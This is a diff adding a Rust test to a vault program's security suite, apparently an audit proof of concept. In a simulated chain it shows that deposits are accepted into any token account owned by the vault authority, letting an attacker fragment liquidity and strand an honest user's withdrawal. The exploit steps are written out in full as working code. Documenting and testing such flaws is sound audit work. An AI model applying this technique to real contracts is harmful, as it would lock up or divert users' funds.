@@ -10025,3 +10025,53 @@ fn v16_attack_non_admin_cannot_resolve_or_configure() {
     assert_eq!(g1.vault, g0.vault - 500_000, "only the legit withdraw moved funds");
     let _ = cfg0;
 }
+
+// security.md sweep — vault liquidity fragmentation (#44 account validation): the vault token
+// account is validated ONLY by owner == vault_authority PDA (verify_vault_token_account /
+// verify_withdrawable_token_accounts), NOT by a canonical address. ANY token account owned by the
+// PDA is accepted. An attacker can create a second vault-authority-owned account, route a deposit to
+// it, and withdraw from the canonical vault — fragmenting liquidity so an honest user's withdrawal
+// against the canonical vault fails (loss-of-funds), at a 1:1 self-cost (abandoned funds).
+#[test]
+fn v16_exploit_vault_fragmentation_strands_honest_withdraw() {
+    let mut env = V16CuEnv::new();
+    // honest user deposits 1,000,000 to the CANONICAL vault.
+    let honest = Keypair::new(); let hp = env.create_portfolio(&honest);
+    env.deposit(&honest, hp, 1_000_000);
+    assert_eq!(env.token_amount(env.vault), 1_000_000, "canonical vault holds the honest deposit");
+
+    // attacker creates a SECOND token account owned by the same vault_authority PDA (anyone can: the
+    // SPL token-account owner field is arbitrary at creation).
+    let attacker = Keypair::new(); let ap = env.create_portfolio(&attacker);
+    let fake_vault = Pubkey::new_unique();
+    env.svm.set_account(fake_vault, Account { lamports: 1_000_000_000, data: make_token_data(env.mint, env.vault_authority, 0), owner: spl_token::ID, executable: false, rent_epoch: 0 }).unwrap();
+    // attacker deposits 500k routed to the FAKE vault. GAP: verify_vault_token_account only checks
+    // owner == vault_authority, so this is ACCEPTED instead of rejected.
+    let atk_src = env.token_account_for_mint(env.mint, attacker.pubkey(), 500_000);
+    env.svm.expire_blockhash();
+    let dep = env.send(ProgInstruction::Deposit { amount: 500_000 }, vec![
+        AccountMeta::new(attacker.pubkey(), true), AccountMeta::new(env.market, false), AccountMeta::new(ap, false),
+        AccountMeta::new(atk_src, false), AccountMeta::new(fake_vault, false), AccountMeta::new_readonly(spl_token::ID, false)], &[&attacker]);
+    assert!(dep.is_ok(), "GAP: deposit to a non-canonical vault-authority-owned account is accepted");
+    assert_eq!(env.portfolio_state(ap).capital, 500_000, "attacker credited 500k capital");
+    assert_eq!(env.token_amount(env.vault), 1_000_000, "the 500k went to the FAKE vault, not canonical");
+    assert_eq!(env.token_amount(fake_vault), 500_000, "fake vault now holds the attacker's deposit");
+
+    // attacker withdraws 500k from the CANONICAL vault (draining honest liquidity, not their own deposit).
+    env.svm.expire_blockhash();
+    let (atk_dest, _) = env.withdraw_with_cu(&attacker, ap, 500_000);
+    assert_eq!(env.token_amount(atk_dest), 500_000, "attacker pulled 500k of HONEST funds from canonical");
+    assert_eq!(env.token_amount(env.vault), 500_000, "canonical vault now under-funded (1M owed, 500k held)");
+
+    // CONSEQUENCE: the honest user can no longer withdraw their full 1,000,000 from the canonical vault.
+    env.svm.expire_blockhash();
+    let hdest = Pubkey::new_unique();
+    env.svm.set_account(hdest, Account { lamports: 1_000_000_000, data: make_token_data(env.mint, honest.pubkey(), 0), owner: spl_token::ID, executable: false, rent_epoch: 0 }).unwrap();
+    let hw = env.send(ProgInstruction::Withdraw { amount: 1_000_000 }, vec![
+        AccountMeta::new(honest.pubkey(), true), AccountMeta::new(env.market, false), AccountMeta::new(hp, false),
+        AccountMeta::new(hdest, false), AccountMeta::new(env.vault, false), AccountMeta::new_readonly(env.vault_authority, false), AccountMeta::new_readonly(spl_token::ID, false)], &[&honest]);
+    assert!(hw.is_err(), "CONFIRMED LoF: honest user's full withdraw fails — canonical vault was fragmented");
+    assert_eq!(env.portfolio_state(hp).capital, 1_000_000, "honest user still owed 1M but canonical holds only 500k");
+    // The stranded 500k sits in fake_vault (vault-authority-owned); honest users never pass it.
+    // Self-sacrificial griefing: the attacker's own 500k is the abandoned, stranded balance.
+}
